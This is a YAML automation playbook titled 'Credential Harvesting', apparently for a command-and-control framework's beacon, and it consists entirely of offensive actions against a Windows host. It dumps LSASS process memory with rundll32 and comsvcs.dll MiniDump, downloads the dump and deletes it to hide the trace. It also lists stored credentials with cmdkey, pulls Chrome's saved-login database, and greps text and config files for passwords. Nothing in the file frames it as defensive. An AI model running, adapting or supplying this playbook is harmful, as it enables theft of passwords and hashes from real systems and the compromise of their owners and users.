name: Credential Harvesting
# Collect credentials from the target system

actions:


  # Dump LSASS memory (requires SYSTEM)
  - name: dump_lsass
    any_of:
        - source: beacon.user
          operator: contains
          value: "SYSTEM"
        - source: beacon.impersonated
          operator: contains
          value: "SYSTEM"
    type: powershell
    parameters:
      command: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
    on_success:
      - name: download_dump
        type: download
        parameters:
          remote_path: C:\Windows\Temp\lsass.dmp
      - name: cleanup_dump
        type: shell
        parameters:
          command: del C:\Windows\Temp\lsass.dmp

  # Check for saved credentials
  - name: enum_creds
    type: shell
    parameters:
      command: cmdkey /list

  # Browser credential paths

  - name: download_chrome_creds
    type: download
    parameters:
      remote_path: "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"

  # Check for interesting files
  - name: search_passwords
    type: shell
    parameters:
      command: findstr /si password *.txt *.ini *.config *.xml
